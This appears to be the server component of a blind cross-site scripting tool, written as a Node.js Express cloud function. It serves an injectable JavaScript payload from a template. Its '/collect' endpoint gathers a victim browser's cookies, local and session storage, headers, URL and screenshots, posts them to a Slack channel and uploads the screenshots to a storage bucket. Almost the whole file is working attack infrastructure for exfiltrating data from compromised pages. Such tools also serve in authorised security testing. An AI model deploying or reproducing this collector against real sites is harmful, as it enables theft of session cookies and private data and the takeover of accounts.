// SPDX-License-Identifier: GPL-3.0-or-later
const {Storage} = require('@google-cloud/storage');
const {SecretManagerServiceClient} = require('@google-cloud/secret-manager');
const bodyParser = require('body-parser');
const cors = require('cors');
const crypto = require("crypto");
const ejs = require('ejs');
const express = require('express');
const fs = require("fs");
const { WebClient } = require('@slack/web-api');

// node constants
const app = express();
const storage = new Storage();
const secretManagerClient = new SecretManagerServiceClient();
const EXTRACT_URL = process.env.GCF_HTTP_URL

let web = null
let channelID = null

// Retrieve GCP Secrets
async function accessSecretVersion() {
	const [version] = await secretManagerClient.accessSecretVersion({
		name: process.env.SECRET_SLACK_TOKEN_NAME,
	});
	const [channelVersion] = await secretManagerClient.accessSecretVersion({
		name: process.env.SECRET_SLACK_CHANNEL_NAME,
	});

	// Extract the payload as a string.
	const payload = version.payload.data.toString();

	web = new WebClient(payload);
	channelID = channelVersion.payload.data.toString();
	console.log("Secrets successfully retrieved!");
}

// template engine
app.set("view engine", "ejs")

// to allow wild cors
app.use(cors());

// Retrieve JavaScript via EJS templates for dynamic content injection
app.get('/',(req,res) => {
	var data = {};
	data.doEnableExtCalls = true;
	data.doScreenshot = true;

	if(req.query.n){
		data.client_name = req.query.n;
	}
	if(req.query.f){
			data.forceFingerprint = req.query.f;
	}
	if(req.query.c){
			data.doEnableExtCalls = false;
			data.doScreenshot = false;
	}
	if(req.query.b){
			data.doEnableExtCalls = false;
			data.doScreenshot = true;
	}
	
	res.render("template", {
		data: data,
		url: EXTRACT_URL
	})
});

// Send XSS collection details to notification channel
app.post('/collect',bodyParser.json(), function (req,res) {
	var blockTemplate = [
		{
			"type": "header",
			"text": {
				"type": "plain_text",
				"text": "[New] Blind XSS Collected",
				"emoji": true
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*Date:*\n`" + new Date() + "`"
			}
		},
		{
			"type": "section",
			"fields": [
				{
					"type": "mrkdwn",
					"text": "*Client IP:*\n" + (req.body.clientip ? req.body.clientip : req.headers['x-forwarded-for'])
				},
				{
					"type": "mrkdwn",
					"text": "*Fingerprint:*\n" + (req.body.fingerprint ? req.body.fingerprint : "N/A")
				}
			]
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*URL:*\n`" + req.body.url + "`"
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*Location:*\n`" + req.body.location + "`"
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*Referrer:*\n`" + req.body.referrer + "`"
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*Origin:*\n`" + req.body.origin + "`"
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*User-Agent:*\n`" + req.body.ua + "`"
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*Local Storage:*\n`" + JSON.stringify(req.body.localStorage) + "`"
			}
		},
		{
			"type": "section",
			"text":
			{
				"type": "mrkdwn",
				"text": "*Session Storage:*\n`" + JSON.stringify(req.body.sessionStorage) + "`"
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*Cookies:*\n`" + req.body.cookies + "`"
			}
		},
		{
			"type": "section",
			"text": 
			{
				"type": "mrkdwn",
				"text": "*Headers:*\n`" + JSON.stringify(req.headers) + "`"
			}
		}
	];

	// post the message to slack	
	(async () => {
		// ensure a screenshot was uploaded with the request
		if (req.body.screenshot){
			// get the screenshot and upload as a second message
			let b64 = req.body.screenshot.split(',')[1];
			fs.writeFileSync('/tmp/ss.png',b64,'base64',(err) => {
				console.log(err);
			});
			blockTemplate = blockTemplate.concat({
				"type": "image",
				"title": {
					"type": "plain_text",
					"text": "Screenshot",
					"emoji": true
				},
				"image_url": "" + await uploadToBucket(req.body.clientname,req.body.fingerprint),
				"alt_text": "GCP Screenshot"
			});
		}

		// ensure secrets have been initialized
		if (!web){
			try{
				await accessSecretVersion();
			} catch(e){
				console.error(e);
			}
		}
       const result = await web.chat.postMessage({
			blocks: blockTemplate,
			channel: channelID,
		});
    })().then(function(){
    	res.status(200).send('COLLECTED');
	});
});

function genUUID(){
	return crypto.randomUUID();
}

// upload screenshot to Google Cloud Storage
async function uploadToBucket(clientname,fingerprint){
	var url2 = null;
	if (!fingerprint){
		fingerprint = "00000000-0000-0000-0000-000000000000";
	}
	const fileName = (clientname) ? "clients/" + clientname + "/" + fingerprint + "/" + genUUID() + ".png" : "all/" + fingerprint + "/" + genUUID() + ".png" ;

	await storage.bucket(process.env.STORAGE_BUCKET_NAME).upload('/tmp/ss.png',{
		destination: fileName,
	});

	// These options will allow temporary read access to the file
	const options = {
		version: 'v4',
		action: 'read',
		expires: Date.now() + 15 * 60 * 1000, // 15 minutes
	};

	// Get a v4 signed URL for reading the file
	const [url] = await storage
		.bucket(process.env.STORAGE_BUCKET_NAME)
		.file(fileName)
		.getSignedUrl(options);
		url2 = url;
	return url2;
}

exports.api = app;